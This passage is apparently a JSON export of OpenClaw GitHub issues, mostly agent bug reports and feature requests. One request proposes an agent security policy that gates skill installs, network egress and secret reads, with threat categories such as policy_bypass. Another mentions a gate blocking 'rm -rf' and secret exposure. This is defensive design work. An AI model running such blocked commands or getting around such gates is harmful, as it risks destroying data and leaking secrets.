      "body": "## Summary\n\nWhen using `anthropic/claude-3-5-sonnet-latest` as the default agent model on the Gateway,\nboth the Control UI `/chat` and the `clawdbot agent` CLI hang (no response),\neven though the Gateway itself starts successfully and Anthropic AI Gateway is configured correctly.\n\nOther Claude 4.5 models (Opus/Haiku) work as expected.\n\n---\n\n## Environment\n\n- Deployment target: Cloudflare Workers + Cloudflare Sandbox container\n- Base image: `cloudflare/sandbox:0.7.0`\n- Node.js in container: `v22.13.1`\n- Clawdbot version: `2026.1.24-3` (`npm install -g clawdbot@2026.1.24-3`)\n- Gateway started via wrapper script that ultimately runs:\n\n  clawdbot gateway \\\n    --port 18789 \\\n    --verbose \\\n    --allow-unconfigured \\\n    --bind lan \\\n    --token <GATEWAY_TOKEN>\n\n\nAnthropic configured via Cloudflare AI Gateway:\n  {\n    \"models\": {\n      \"providers\": {\n        \"anthropic\": {\n          \"baseUrl\": \"https://gateway.ai.cloudflare.com/v1/<CF_ACCOUNT_ID>/<GATEWAY_ID>/compat\",\n          \"api\": \"anthropic-messages\",\n          \"apiKey\": \"sk-ant-****\",      // redacted\n          \"models\": [\n            { \"id\": \"claude-opus-4-5-20251101\",   \"name\": \"Claude Opus 4.5\" },\n            { \"id\": \"claude-sonnet-4-5-20250929\", \"name\": \"Claude Sonnet 4.5\" },\n            { \"id\": \"claude-3-5-sonnet-latest\",   \"name\": \"Claude Sonnet 3.5\" },\n            { \"id\": \"claude-haiku-4-5-20251001\",  \"name\": \"Claude Haiku 4.5\" }\n          ]\n        }\n      }\n    },\n    \"agents\": {\n      \"defaults\": {\n        \"model\": {\n          \"primary\": \"anthropic/claude-3-5-sonnet-latest\"\n        }\n      }\n    },\n    \"gateway\": {\n      \"port\": 18789,\n      \"mode\": \"local\",\n      \"auth\": { \"token\": \"<GATEWAY_TOKEN>\" },\n      \"controlUi\": { \"allowInsecureAuth\": true }\n    }\n  }\n\n(all secrets and IDs above are placeholders / redacted)\nSteps to reproduce\nConfigure the Gateway as above (Anthropic via Cloudflare AI Gateway, primary model anthropic/claude-3-5-sonnet-latest).\nStart the Gateway (clawdbot gateway ...).\nOpen the Control UI /chat behind a reverse proxy (Cloudflare Workers in my case).\nIn chat:\n   /model anthropic/claude-3-5-sonnet-latest /new\nthen send a simple message like \"こんにちは\".\nObserve:\nHealth indicator is OK\nChat shows “thinking” for a few seconds\nNo assistant message ever appears and no visible error is shown\nFrom inside the same container, call:\n   clawdbot agent --agent main --message \"こんにちは\" --timeout 60 --json\nObserve:\nOnly a DeprecationWarning for punycode on stderr\nNo further stderr output\nCommand hangs until the outer timeout fires, no JSON result on stdout\nActual logs (sanitized)\nFrom the gateway stdout:\n[gateway] agent model: anthropic/claude-3-5-sonnet-latest[gateway] listening on ws://0.0.0.0:18789 (PID XXXX)[ws] → event health seq=1 clients=0 presenceVersion=1 healthVersion=2# When connecting from Control UI:/* earlier, with 4.5 models, I saw events like:[ws] ← open remoteAddr=10.1.0.0 conn=...[ws] closed before connect ... cause=pairing-required ...*/# With 3.5 Sonnet:[ws] ← open remoteAddr=10.1.0.0 conn=45368c34…e1b0[ws] handshake timeout conn=45368c34-2593-4416-a8ce-3049f7e2e1b0 remote=10.1.0.0[ws] closed before connect ... code=1000 reason=n/a cause=handshake-timeout handshake=failed# When using a simple ws debug endpoint:Connecting to wss://<my-domain>/...Connected!RECV: {\"type\":\"event\",\"event\":\"connect.challenge\",\"payload\":{\"nonce\":\"...\",\"ts\":...}}Closed: code=1000 reason=\nFrom the clawdbot agent call (wrapped via an HTTP debug endpoint):\n{  \"command\": \"clawdbot agent --agent main --message こんにちは --timeout 60 --json\",  \"status\": \"running\",  \"attempts\": 30,  \"stdout\": \"\",  \"stderr\": \"(node:XXX) [DEP0040] DeprecationWarning: The `punycode` module is deprecated. Please use a userland alternative instead.\\\\n\"}\nThere is no further error after the DeprecationWarning; the process just never returns a reply.\nExpected behavior\nControl UI /chat: After selecting anthropic/claude-3-5-sonnet-latest and sending a message, a normal assistant reply should appear.\nCLI: clawdbot agent --agent main --message \"こんにちは\" --timeout 60 --json should return a JSON object with the assistant’s reply within the timeout.\nActual behavior\nControl UI:\nHealth is OK, but after sending a message the UI shows “thinking” and never renders a response.\nCLI:\nclawdbot agent --agent main --message ... never returns a JSON result and appears to hang, even with --timeout 60.\nGateway logs show WebSocket handshake open and then a handshake-timeout from the Control UI, but no clear error for the agent call.\nNotes\nIf I revert the default model back to a 4.5 model (e.g. anthropic/claude-opus-4-5-20251101), both the Control UI and clawdbot agent work as expected again.\nThis suggests the issue is specific to the claude-3-5-sonnet-latest integration path.\nIf there is a recommended way to configure Claude 3.5 Sonnet (different model id, auth profile, or agent config), I’m happy to test it.\n  ",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13997",
      "createdAt": "2026-02-11T09:19:56Z",
      "updatedAt": "2026-02-11T09:19:56Z",
      "author": "shingo257",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "docker"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 4864,
      "title": "Discord: Messages lost when bot takes >2 min to respond (Slow listener timeout)",
      "body": "### Problem\n\nWhen the Discord bot takes a long time (>2 minutes) to process and respond to a message, the response sometimes never arrives in Discord, even though the bot successfully completed the action.\n\n### Observed behavior\n\n1. User sends message in Discord thread\n2. Bot receives and processes message (confirmed via logs and session history)\n3. Bot performs action (e.g., saves API key to config, restarts gateway)\n4. Bot sends response — **but response never appears in Discord**\n\nThe user sees typing indicator for ~2 minutes, then nothing.\n\n### Log evidence\n\n```\nSlow listener detected: discord message handler took 132061ms\n```\n\n### Environment\n\n- Windows 11\n- OpenClaw 2026.1.29\n- Discord thread (child of private channel)\n- Model: github-copilot/claude-opus-4.5\n\n### Hypothesis\n\nWhen the listener takes >2 minutes, the Discord WebSocket connection may time out or lose sync, causing outbound messages to be dropped silently. Discord's WebSocket has a heartbeat interval and may consider the connection stale.\n\n### Workaround\n\nUsing webchat or parent channel for complex operations that might take >1 minute.\n\n### Additional context\n\nThis may be related to earlier lane processing issues with Discord threads:\n- Threads sometimes get stuck with messages in queue (`lane enqueue` without corresponding `lane dequeue`)\n- `discord channels unresolved` warnings appear in logs for thread IDs",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4864",
      "createdAt": "2026-01-30T19:34:52Z",
      "updatedAt": "2026-02-11T09:17:38Z",
      "author": "digitaldias",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [
          "windows"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3882022320,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4864#issuecomment-3882022320",
          "createdAt": "2026-02-11T04:13:24Z",
          "updatedAt": "2026-02-11T04:13:24Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        },
        {
          "id": 3883203403,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4864#issuecomment-3883203403",
          "createdAt": "2026-02-11T09:17:38Z",
          "updatedAt": "2026-02-11T09:17:38Z",
          "author": "iwahbe",
          "body": "I'm still seeing this error:\n\n```\n[discord] Slow listener detected: DiscordMessageListener took 54 seconds for event MESSAGE_CREATE\n```"
        }
      ]
    },
    {
      "number": 13494,
      "title": "Grok (xAI) web_search provider: 400 error from include: [\"inline_citations\"] + timeout when disabled",
      "body": "## Bug Description\n\nWhen using Grok (xAI) as the `web_search` provider, searches fail in two ways:\n\n### 1. `include: [\"inline_citations\"]` causes 400 error\n\n`runGrokSearch()` in the gateway sends `include: [\"inline_citations\"]` to the xAI Responses API. xAI rejects this with HTTP 400 — the parameter is not supported (or uses a different format) on their Responses endpoint.\n\n### 2. Even with `inlineCitations: false`, web_search hangs\n\nSetting `inlineCitations: false` in the Grok search config does not prevent the issue. The web_search tool call hangs for 30+ seconds and then times out silently, with no result returned.\n\n### 3. Regular chat works fine\n\nThe same xAI API key works perfectly for chat completions (`grok-4-0709`). The issue is isolated to the Responses API / web search path.\n\n## Steps to Reproduce\n\n1. Configure Grok as the web search provider:\n   ```json\n   {\n     \"agents\": {\n       \"defaults\": {\n         \"search\": {\n           \"provider\": \"grok\",\n           \"grok\": {\n             \"model\": \"grok-4-0709\",\n             \"inlineCitations\": false\n           }\n         }\n       }\n     }\n   }\n   ```\n2. Trigger a web search (e.g., ask the agent to search for something)\n3. Observe: request either returns 400 or hangs for 30s+ with no results\n\n## Expected Behavior\n\n- `inlineCitations: false` should prevent `include: [\"inline_citations\"]` from being sent\n- Timeout should be reasonable and surface an error rather than silently failing\n- Ideally, the `include` parameter should match what xAI's Responses API actually accepts\n\n## Workaround\n\nReverted to Brave Search (`provider: \"brave\"`), which works correctly.\n\n## Environment\n\n- OpenClaw version: 2026.2.6-3\n- OS: macOS (arm64)\n- xAI API key: valid (chat completions work)\n- Relevant code: `runGrokSearch()` in bundled gateway JS",
      "state": "open",
      "comments": 4,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13494",
      "createdAt": "2026-02-10T15:45:50Z",
      "updatedAt": "2026-02-11T09:16:24Z",
      "author": "bombass1981",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3881506266,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13494#issuecomment-3881506266",
          "createdAt": "2026-02-11T00:39:31Z",
          "updatedAt": "2026-02-11T00:39:31Z",
          "author": "Takhoffman",
          "body": "Thanks for the report.\n\nThe `include: [\"inline_citations\"]` 400 is fixed by #12945 (merged).\n\nThe remaining behavior you describe (hanging until timeout even with `inlineCitations: false`) sounds like a separate issue. Can you add:\n- your exact OpenClaw version\n- your `tools.web.search` config block (redacted)\n- a recent gateway log excerpt showing the timeout/error\n\nAlso, note the Grok web search config keys live under `tools.web.search.*` (not `agents.defaults.search.*`).\n"
        },
        {
          "id": 3883109560,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13494#issuecomment-3883109560",
          "createdAt": "2026-02-11T08:54:57Z",
          "updatedAt": "2026-02-11T08:54:57Z",
          "author": "bombass1981",
          "body": "Thanks for the quick response @Takhoffman!\n\n**OpenClaw version:** `2026.2.9` (installed via `2026.2.6-3`, config `lastTouchedVersion: 2026.2.9`)\n\n**`tools.web.search` config block:**\n\n```json\n{\n  \"tools\": {\n    \"web\": {\n      \"search\": {\n        \"provider\": \"brave\",\n        \"maxResults\": 5,\n        \"timeoutSeconds\": 30,\n        \"grok\": {\n          \"model\": \"grok-4-latest\",\n          \"inlineCitations\": false\n        }\n      }\n    }\n  }\n}\n```\n\n*(Currently reverted to `provider: \"brave\"` as workaround — Grok config is still present but inactive.)*\n\n**Reproduction timeline (from gateway logs):**\n\n1. Set `provider: \"grok\"` → gateway restarted\n2. First web_search call → 400 error (the `include: [\"inline_citations\"]` issue, which #12945 fixes ✅)\n3. Set `inlineCitations: false` in config → gateway restarted\n4. Second web_search call → **hangs for 30s+, no result returned, no error in logs**\n5. Tested Grok API directly via `curl` (chat completions) → works fine, responds in ~2s\n6. Reverted to `provider: \"brave\"` → works immediately\n\n**Gateway log excerpts (relevant lines):**\n\n```\n2026-02-09T21:22:33.387Z [reload] config change detected; evaluating reload (...tools.web.search.provider, tools.web.search.grok...)\n2026-02-09T21:40:34.730Z The search is timing out.\n2026-02-09T21:40:36.055Z No dedicated search endpoint — Grok web search must go through chat completions. The error we saw earlier (include parameter not supported) confirms OpenClaw Grok integration has a bug. It is sending a parameter meant for Brave/Perplexity that xAI does not support.\n```\n\nThe hang with `inlineCitations: false` might be a separate code path issue — perhaps the gateway still sends `include` even when the config flag is false, and the xAI API silently drops the connection instead of returning a 400.\n\nHappy to test a patched build if you point me to one."
        },
        {
          "id": 3883191599,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13494#issuecomment-3883191599",
          "createdAt": "2026-02-11T09:14:54Z",
          "updatedAt": "2026-02-11T09:14:54Z",
          "author": "bombass1981",
          "body": "**Update: Root cause identified for Bug 2 (timeout/hang)**\n\nI tested the xAI Responses API directly via curl with `tools: [{\"type\": \"web_search\"}]`:\n\n```\ncurl -m 60 https://api.x.ai/v1/responses \\\n  -H \"Authorization: Bearer $XAI_API_KEY\" \\\n  -d '{\"input\": \"What is the Bitcoin price right now?\", \"model\": \"grok-4-latest\", \"tools\": [{\"type\": \"web_search\"}]}'\n```\n\n**Result:** HTTP 200, correct response with citations — but it took **37 seconds**.\n\nThe xAI Responses API with web_search is fundamentally slow (~30-40s) because it:\n1. Performs the search\n2. Opens/browses web pages (visible in the response: `web_search_call` → `open_page`)\n3. Reasons over the content\n4. Generates the response\n\n**The problem:** OpenClaw's default `timeoutSeconds: 30` kills the request before xAI finishes. Setting `timeoutSeconds: 60` (or even 90) in `tools.web.search` should fix it.\n\nShould OpenClaw auto-detect the Grok provider and use a longer default timeout? Or is this already configurable and I just need to bump my config value?"
        },
        {
          "id": 3883197821,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13494#issuecomment-3883197821",
          "createdAt": "2026-02-11T09:16:24Z",
          "updatedAt": "2026-02-11T09:16:24Z",
          "author": "bombass1981",
          "body": "**🎯 Found the actual bug — response parsing is wrong**\n\nThe timeout was a red herring. Even with 90s timeout, Grok search returns `\"No response\"` despite the xAI API returning valid data.\n\n**Root cause in `runGrokSearch()` (reply-DptDUVRg.js):**\n\n```js\nreturn {\n    content: data.output_text ?? \"No response\",      // ← BUG\n    citations: data.citations ?? [],                   // ← BUG  \n    inlineCitations: data.inline_citations             // ← BUG\n};\n```\n\nThe xAI Responses API does NOT have top-level `output_text` or `citations` fields. The actual response structure is:\n\n```json\n{\n  \"output\": [\n    { \"type\": \"web_search_call\", \"status\": \"completed\", \"action\": { \"type\": \"search\", \"query\": \"...\" } },\n    { \"type\": \"web_search_call\", \"status\": \"completed\", \"action\": { \"type\": \"open_page\", \"url\": \"...\" } },\n    {\n      \"type\": \"message\",\n      \"role\": \"assistant\", \n      \"content\": [{\n        \"type\": \"output_text\",\n        \"text\": \"As of February 11, 2026, Bitcoin is approximately $66,894...\",\n        \"annotations\": [\n          { \"type\": \"url_citation\", \"url\": \"https://coinmarketcap.com/...\", \"start_index\": 128, \"end_index\": 180 }\n        ]\n      }]\n    }\n  ]\n}\n```\n\n**The fix should be:**\n\n```js\n// Extract text from the message output item\nconst messageOutput = data.output?.find(o => o.type === \"message\");\nconst textContent = messageOutput?.content?.find(c => c.type === \"output_text\");\n\n// Extract citations from annotations\nconst annotations = textContent?.annotations?.filter(a => a.type === \"url_citation\") ?? [];\nconst citationUrls = annotations.map(a => a.url);\n\nreturn {\n    content: textContent?.text ?? \"No response\",\n    citations: citationUrls,\n    inlineCitations: annotations\n};\n```\n\nVerified with raw curl — the xAI API returns perfect results with citations in ~37s. OpenClaw just isn't reading them from the correct JSON path."
        }
      ]
    },
    {
      "number": 12385,
      "title": "[Feature]: Security - Context-Based Runtime Security Policy (Shield.md)",
      "body": "## Summary\n\nOpenClaw agents can install/execute skills, call tools, talk to MCP servers, make outbound requests, and read secrets. Today, the “should we proceed?” logic is inconsistent across features and easy to bypass or forget, which increases the risk of accidental data exfiltration and unsafe execution.\n\nProposals: add a single, deterministic, context-driven security policy ([shield.md](https://nova-hunting.github.io/shield.md/)) that standardizes preflight decisions (log, require_approval, block) based on structured threat objects, with strict output formatting and bounded context.\n\nThis security baselines can work alongside guardrails and additional protection. This baseline would also work for any other AI agent.\n\n## Proposed solution\n\nAdd an optional Shield policy layer to OpenClaw that runs before sensitive events and produces a mandatory decision:\n\n- Add a [shield.md](https://nova-hunting.github.io/shield.md/) policy format (frontmatter + spec) that OpenClaw can load as \"active threats (compressed)\". You simply need to specify it to your SOUL.md AGENTS.md MEMORY.md.\n- Gate these scopes: prompt, skill.install, skill.execute, tool.call, network.egress, secrets.read, mcp.\n\nBefore executing any gated event: Evaluate active, eligible threats (not revoked, not expired).\n\n- Match deterministically using recommendation_agent directives first, then only explicit fallback string matches (no inference).\n- Apply confidence rule: >= 0.85 enforceable; < 0.85 defaults to require_approval except critical block.\n- Resolve multiple matches by precedence: block > require_approval > log.\n\nEmit a DECISION block first and stop (hard pause) with:\n\n- action, scope, threat_id, fingerprint, matched_on, match_value, reason.\n- Required behaviors:\n- block: respond exactly Blocked. Threat matched: <threat_id>. Match: <matched_on>=<match_value>. and stop.\n- require_approval: ask exactly one yes/no question and stop.\n- log: continue normally.\n\nThis can start as “policy-guided” (model follows it) and later become runtime-enforced without changing the threat format.\n\n## Alternatives considered\n\n- Per-tool hardcoded allow/deny lists: simpler but too coarse, not threat-object driven, and hard to evolve.\n- Free-text safety rules in prompts: ambiguous and non-deterministic; difficult to audit.\n- Full runtime enforcement immediately: ideal long-term, but higher integration cost without first standardizing threat format and decision semantics.\n- External policy engine without shared spec: stronger enforcement but risks fragmentation without a canonical [shield.md](https://nova-hunting.github.io/shield.md/#spec) format.\n\n## Additional context\n\n- Proposed spec/source of truth: [shield.md](app://-/index.html#) (threat-object feed + decision contract)\n- Key properties: deterministic matching, three-state outcome only, strict output format, supports MCP, bounded context (max 25 threats)\n- Categories to support: prompt, tool, mcp, memory, supply_chain, vulnerability, fraud, policy_bypass, anomaly, skill, other\n\nFind a concrete usage here: https://x.com/fr0gger_/thread/2020424165682208822\n\nAdditional details about Shield here: https://nova-hunting.github.io/shield.md/\n\nBelow is SHIELD.md example:\n\n[shield.md](https://github.com/user-attachments/files/25175397/shield.md)",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12385",
      "createdAt": "2026-02-09T06:27:02Z",
      "updatedAt": "2026-02-11T09:12:24Z",
      "author": "fr0gger",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3880792215,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12385#issuecomment-3880792215",
          "createdAt": "2026-02-10T21:24:49Z",
          "updatedAt": "2026-02-10T21:24:49Z",
          "author": "EricNetsch",
          "body": "please no more md files to attempt to solve security. we need more hard configs that are bulletproof not more md files "
        },
        {
          "id": 3883181616,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12385#issuecomment-3883181616",
          "createdAt": "2026-02-11T09:12:24Z",
          "updatedAt": "2026-02-11T09:12:24Z",
          "author": "fr0gger",
          "body": "Hey @EricNetsch, this is not security by markdown. this file is a policy that standardizes how agents have their security configured. It provides a common structure and can be coupled with any enforcement tool to apply hard controls. Think of it as a security baseline that security tools can evaluate and enforce consistently. The goal is to create a unified policy structure, not to rely on markdown as the security mechanism itself. Hope that help clarify the goal :) "
        }
      ]
    },
    {
      "number": 13989,
      "title": "Webchat UI renders inbound metadata as user message content",
      "body": "## Problem\n\nWhen messages arrive from Telegram (and likely other channels), OpenClaw injects `Conversation info (untrusted metadata)` context into the inbound message for the agent. This is correct behavior for agent context — it tells the agent who's talking and what chat the message came from.\n\nHowever, the **webchat UI renders this metadata as part of the user's visible message**, making every Telegram-originated message look like this:\n\n```\nConversation info (untrusted metadata):\n{\n  \"conversation_label\": \"Kayvan Sylvan (@myusername) id:XXXXXXXXXX\"\n}\n\nTesting testing 1 2 3. Why is the sky blue during the day and black at night?\n```\n\n## Expected Behavior\n\nThe metadata block should be **stripped from the displayed message** in the webchat UI. It's internal context for the agent, not something the user typed.\n\nThe agent should still receive the full context (including metadata) — this is purely a UI rendering issue.\n\n## Reproduction\n\n1. Send a message from Telegram to OpenClaw\n2. Open the webchat UI\n3. Observe the Telegram chat — every user message includes the raw metadata block\n\n## Suggested Fix\n\nStrip the `Conversation info (untrusted metadata): { ... }` block from the rendered message content in the webchat frontend before display.\n\n🐧 Filed by Tux",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13989",
      "createdAt": "2026-02-11T09:09:01Z",
      "updatedAt": "2026-02-11T09:09:01Z",
      "author": "ksylvan",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": [
          "web-ui"
        ]
      }
    },
    {
      "number": 13987,
      "title": "[Bug]: New session doesn't auto-load memory files",
      "body": "**Bug Report: New session doesn't auto-load memory files**\n\n**Description:**  \nWhen creating a new session via `/new` or `/reset`, the memory files specified in `AGENTS.md` are not automatically loaded, causing the AI to lose all context about identity, user, and recent activities.\n\n**Expected Behavior:**  \nAccording to `AGENTS.md` > \"Every Session\", the following files should be automatically loaded at the start of each session:\n\n1. `SOUL.md` — who the AI is\n2. `USER.md` — who the user is  \n3. `memory/YYYY-MM-DD.md` (today + yesterday) — recent context\n4. `MEMORY.md` — long-term memory (main sessions only)\n\n**Actual Behavior:**  \nWhen `/new` or `/reset` is triggered, none of these files are automatically read. The agent starts with zero context and must manually call the `read` tool to access these files.\n\n**Impact:**  \n- New sessions start \"blank\" — AI doesn't know its name, user's name, or previous work\n- Violates the \"Continuity\" principle from `SOUL.md`: \"Each session, you wake up fresh. These files _are_ your memory.\"\n- Makes `/reset` effectively a hard reset rather than a context refresh\n\n**Environment:**  \n- OpenClaw Version: 2026.2.9\n- Node.js: v22.22.0\n- OS: Linux 6.8.0-71-generic\n- Workspace: `/root/workspace`\n\n**Steps to Reproduce:**  \n1. Have populated `SOUL.md`, `USER.md`, and `memory/2026-02-11.md` files\n2. Send `/new` or `/reset` in a chat\n3. Observe the AI greeting without any knowledge of its identity or user",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13987",
      "createdAt": "2026-02-11T09:07:39Z",
      "updatedAt": "2026-02-11T09:07:39Z",
      "author": "frankzzziii",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": []
      }
    },
    {
      "number": 13982,
      "title": "/model default resolves to 'anthropic/default' instead of resetting to configured default model",
      "body": "## Bug\n\nWhen using `/model deepseek/deepseek-chat` to switch to a fallback model, then running `/model default` to switch back, OpenClaw interprets 'default' as a model name rather than a reset command.\n\n### Expected behavior\n`/model default` should reset the model override and return to the configured default model (e.g. `anthropic/claude-opus-4-6`).\n\n### Actual behavior\n`/model default` tries to set the model to `anthropic/default`, which fails with:\n```\nModel \"anthropic/default\" is not allowed. Use /models to list providers, or /models <provider> to list models.\n```\n\n### Workaround\nUse the full model name: `/model anthropic/claude-opus-4-6`\n\nOr use the session_status tool with `model=default` parameter, which correctly resets the override.\n\n### Environment\n- OpenClaw 2026.2.9\n- Channel: WhatsApp",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13982",
      "createdAt": "2026-02-11T09:02:54Z",
      "updatedAt": "2026-02-11T09:02:54Z",
      "author": "dennisklappe",
      "labels": [],
      "taxonomy": {
        "channels": [
          "whatsapp"
        ],
        "platforms": [],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 13604,
      "title": "How should custom pages subscribe to agent activity events via WebSocket?",
      "body": "## Summary\n\nI have a custom status page (single HTML file) served from the gateway's Control UI directory at `http://127.0.0.1:18789/talos-status.html`. It connects via WebSocket, authenticates with device identity (Ed25519 signature, device token), and successfully receives `health`, `tick`, `presence`, and `session` events.\n\nHowever, it does **not** receive `agent` or `chat` events (tool calls, messages, lifecycle events).\n\nThe built-in Control UI at `http://127.0.0.1:18789/` on the same origin, same browser, same device identity **does** receive these events.\n\n## What I've verified\n\n- Page connects as `clientName: 'openclaw-control-ui'`, `mode: 'webchat'`, `role: 'operator'`\n- Device identity attached and verified (device token issued in hello-ok response)\n- `chat.history` called for `agent:main:main` session — succeeds but doesn't trigger event delivery\n- Scopes: `['operator.admin', 'operator.approvals', 'operator.pairing']` (same as Control UI)\n- `verboseDefault: 'on'` in config\n- Confirmed via raw WS message capture: zero `agent` or `chat` events received\n- Gateway source shows `broadcastInternal` sends to all clients in the `clients` Set with no scope guard on `agent` events\n\n## Environment\n\n- OpenClaw 2026.2.9\n- macOS, local gateway (`bind: loopback`)\n- Protocol v3\n\n## Question\n\nIs there a subscribe/watch mechanism that custom WebSocket clients need to call to start receiving agent activity events? Or is there a specific client configuration difference that gates event delivery?",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13604",
      "createdAt": "2026-02-10T18:56:54Z",
      "updatedAt": "2026-02-11T08:57:02Z",
      "author": "talos-b",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3881062225,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13604#issuecomment-3881062225",
          "createdAt": "2026-02-10T22:23:53Z",
          "updatedAt": "2026-02-10T22:23:53Z",
          "author": "talos-b",
          "body": "## Additional context: what was working before\n\nBefore upgrading from OpenClaw 2026.2.1 → 2026.2.9, this same status page worked correctly when opened as a `file://` URL directly in Chrome. It connected via WebSocket, authenticated with just the gateway token (no device identity), and received all agent events (tool calls, messages, lifecycle).\n\nAfter the upgrade to 2026.2.9:\n1. `file://` origin gets rejected (`Origin: null` not accepted despite `\"null\"` in `allowedOrigins`)\n2. Moved the page to the gateway's own static directory (`dist/control-ui/`) so it's served from `http://127.0.0.1:18789/` — same origin as the built-in Control UI\n3. Added Ed25519 device identity signing (reusing the keypair from localStorage `openclaw-device-identity-v1`, signing via WebCrypto PKCS8 import)\n4. Page now connects successfully, device token is issued in hello-ok response\n5. `health`, `tick`, `presence`, `session` events arrive normally\n6. Zero `agent` or `chat` events — confirmed via raw WebSocket message capture\n\nThe built-in Control UI at the same origin, same browser, same device identity DOES receive agent events. The custom page uses identical connect params (`clientName: 'openclaw-control-ui'`, `mode: 'webchat'`, `role: 'operator'`, same scopes).\n\nI traced through the minified gateway source and confirmed `broadcastInternal` iterates all entries in the `clients` Set with no scope guard on `agent` events (`hasEventScope` returns true). Yet the custom page doesn't receive them.\n\nSomething changed between 2.1 and 2.9 in how agent events are routed to WebSocket clients, or there's a registration step the built-in Control UI performs that isn't obvious from the minified source."
        },
        {
          "id": 3883117617,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13604#issuecomment-3883117617",
          "createdAt": "2026-02-11T08:57:02Z",
          "updatedAt": "2026-02-11T08:57:02Z",
          "author": "talos-b",
          "body": "**Context:** Prior to the OpenClaw 2.2 security update that tightened origin validation, I had a working `file://` version of a custom status page (talos-status.html) that successfully received agent events via WebSocket. The 2.2 update deliberately rejects `Origin: null` (which is what `file://` sends), which was a smart security decision but broke that approach.\n\nThe current workaround serves the page from the gateway's own static directory at `:18789/talos-status.html`, which resolves the origin issue. However, the page still only receives health/tick/presence events — not agent activity events (tool calls, messages, etc.). The built-in Control UI on the same origin does receive these events, so there appears to be an additional subscription or event routing mechanism that custom pages don't have access to."
        }
      ]
    },
    {
      "number": 9244,
      "title": "[Feature]: Cost-Optimized LLM Gateway for OpenClaw",
      "body": "# Feature Request: Cost-Optimized LLM Gateway for OpenClaw\n\n## Summary\n\nImplement an intelligent LLM Gateway to optimize API costs and improve response quality through smart routing, multi-tier caching, diff-only responses, and security controls.\n\n\nUpdate Feb 11: since there are many pending requests i vibe coded the gateway meanwhile as separate project\n[https://github.com/sp4cerat/LLM-Gateway](https://github.com/sp4cerat/LLM-Gateway)\n\nFull Text here\n[https://github.com/sp4cerat/Cost-Optimized-LLM-Gateway-for-OpenClaw](https://github.com/sp4cerat/Cost-Optimized-LLM-Gateway-for-OpenClaw)\n\n## Problem Statement\n\nOpenClaw currently makes direct LLM API calls, resulting in:\n- **High costs**: Claude Sonnet at $3/1M input + $15/1M output can quickly exceed $100+/month with 100+ requests/day\n- **Wasteful output tokens**: Returning full files instead of diffs wastes 90% of output tokens\n- **No caching**: Redundant requests for similar queries waste API credits\n- **Inefficient routing**: All requests use premium models regardless of complexity\n- **Security risks**: No centralized policy enforcement for dangerous commands or sensitive data\n- **No budget controls**: Risk of runaway API costs without spending caps\n\n## Proposed Solution\n\nImplement a **cost-optimized LLM Gateway** with the following architecture:\n\n### 🎯 Core Components\n\n#### 1. **Three-Tier Intelligent Routing**\n- **Local** (Haiku via Groq): Simple questions → $0.25/1M (~200ms latency)\n- **Cheap** (Claude Haiku): Explanations, documentation → $0.25/1M input, $1.25/1M output\n- **Premium** (Claude Sonnet): Code generation, complex tasks → $3/1M input, $15/1M output\n\n#### 2. **Diff-Only Response Format** 🆕\n- Premium models return **unified diffs** instead of complete files\n- **90% output token reduction** for code patches (500-2000 tokens → 50-200 tokens)\n- **85% cost savings** on Sonnet output ($15/1M)\n- System prompt instructs: \"For code changes, return unified diff format only\"\n- Automatic patch validation and risk scoring before application\n\n#### 3. **Two-Stage Caching System**\n- **Exact Cache** (SHA-256): 100% accurate matches with working-tree fingerprint for context awareness\n- **Semantic Cache** (Embeddings): Similarity-based matching (>92% threshold) with risk-stratified verification\n\n#### 4. **Security Layer**\n- **Hard Policy Gate**: Blocks dangerous commands (`rm -rf`, secret exposure) before LLM call\n- **Rate Limiting**: Token-aware limits per tier with burst allowance\n- **Kill Switch**: Three-level budget protection (Soft → Throttle → Hard stop)\n\n#### 5. **Cost Optimization Features**\n- **Groq Router**: Fast intent classification (150-250ms, $0.05/1M) instead of local Ollama\n- **Prompt Caching**: 90% discount on repeated system prompts via Anthropic's cache\n- **Context Budgeting**: Tier-based token limits with smart compression\n- **Query Embedding Cache**: 30-day cache for embedding vectors 